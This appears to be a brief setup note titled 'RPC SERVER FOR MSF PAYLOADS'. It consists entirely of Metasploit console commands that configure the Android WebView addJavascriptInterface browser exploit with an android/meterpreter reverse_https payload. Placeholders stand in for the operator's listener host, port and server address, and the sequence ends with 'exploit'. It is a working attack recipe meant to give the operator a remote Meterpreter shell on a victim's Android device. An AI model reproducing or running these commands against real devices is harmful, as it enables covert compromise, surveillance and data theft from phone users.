RPC SERVER FOR MSF PAYLOADS

# connection 
use exploit/android/browser/webview_addjavascriptinterface
set PAYLOAD android/meterpreter/reverse_https
set LHOST <your_django_server_url>
set LPORT <your_listener_port>
set URIPATH /
set SSL true
set SRVPORT <your_server_port>
set SRVHOST <your_server_ip>
exploit
